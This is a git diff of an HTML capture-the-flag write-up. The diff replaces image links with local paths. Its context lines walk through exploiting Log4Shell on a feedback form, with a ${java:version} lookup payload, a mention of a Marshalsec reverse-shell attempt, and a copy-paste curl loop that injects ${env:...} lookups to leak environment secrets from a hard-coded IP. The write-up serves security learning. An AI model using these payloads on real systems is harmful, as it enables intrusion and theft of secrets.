@@ -198,19 +198,19 @@
 
     <h2>0. The challenge description</h2>
     <p>The challenge description is interesting. It mentions an old Java version, which could be an old exploit.</p>
-    <img src="https://github.com/user-attachments/assets/81a61722-71a8-417f-8c3d-4f0635109c69" alt="Challenge Description">
+    <img src="Pic/FeedbackFallout/1.png" alt="Challenge Description">
 
     <h2>1. The Feedback page.</h2>
     <p>The moment I entered the page, there was nothing other than a simple feedback Textarea.</p>
-    <img src="https://github.com/user-attachments/assets/b8d412d8-1c01-42d0-bc05-eff148bf4d22" alt="Feedback form">
+    <img src="Pic/FeedbackFallout/2.png" alt="Feedback form">
 
     <p>I inspected the source and Network tab → nothing useful.</p>
 
     <h2>2. Discovering the Vulnerability</h2>
     <p>Intercepted the POST request with ZAP and saw our feedback being logged directly on the server response:</p>
-    <img src="https://github.com/user-attachments/assets/ceb22927-44ac-4f77-9621-cc402f2cd663" alt="ZAP intercept">
+    <img src="Pic/FeedbackFallout/3.png" alt="ZAP intercept">
     <p>So I started googling about Logs exploit, and then I remembered, <code>"Logs four"</code> at the bottom of the feedback page, which could lead to something.</p>
-    <img src="https://github.com/user-attachments/assets/6de0d39c-c4c4-4ba6-bd6a-4359cd074ec5" alt="Challenge hint!">
+    <img src="Pic/FeedbackFallout/4.png" alt="Challenge hint!">
     <p>I came across an old Java vulnerability, <code>Log4Shell (CVE-2021-44228)</code></p>
     <p>I Tried to get a reverse shell using <code>Marshalsec</code></p>
     <pre><code>
@@ -226,7 +226,7 @@
     <p>So, I tried a Basic syntax</p>
     <pre><code>${java:version}</code></pre>
 
-    <img src="https://github.com/user-attachments/assets/47f8d08b-e228-49f0-af15-cb69412853b8" alt="Java version leaked">
+    <img src="Pic/FeedbackFallout/5.png" alt="Java version leaked">
 
     <p>So, Since <code>JNDI</code> Is disabled, AND the java still leaks info, What if i just bruteforce <code>${env:KEY}</code></p>
 
@@ -249,7 +249,7 @@
     -d "feedback=${env:$i}" | grep -o "User .*"
 done</code></pre>
 
-    <img src="https://github.com/user-attachments/assets/25021d73-134d-4c96-95f2-6ea222abfca7" alt="Flag found">
+    <img src="Pic/FeedbackFallout/6.png" alt="Flag found">
 
     <p>One-liner version (copy-paste ready):</p>
     <pre><code>for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying ${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=${env:$i}" | grep -o "User .*"; done</code></pre>
